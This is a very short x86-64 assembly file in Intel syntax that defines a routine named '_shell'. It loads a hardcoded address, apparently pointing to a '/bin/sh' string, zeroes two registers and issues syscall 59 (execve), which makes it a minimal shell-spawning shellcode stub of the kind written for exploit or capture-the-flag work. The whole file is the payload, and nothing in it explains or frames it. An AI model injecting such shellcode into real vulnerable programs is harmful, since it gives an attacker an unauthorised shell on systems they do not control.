.intel_syntax noprefix
.globl _shell

_shell:
mov rdi, 0x404060 
mov rsi, 0
mov rdx, 0
mov rax, 59
syscall
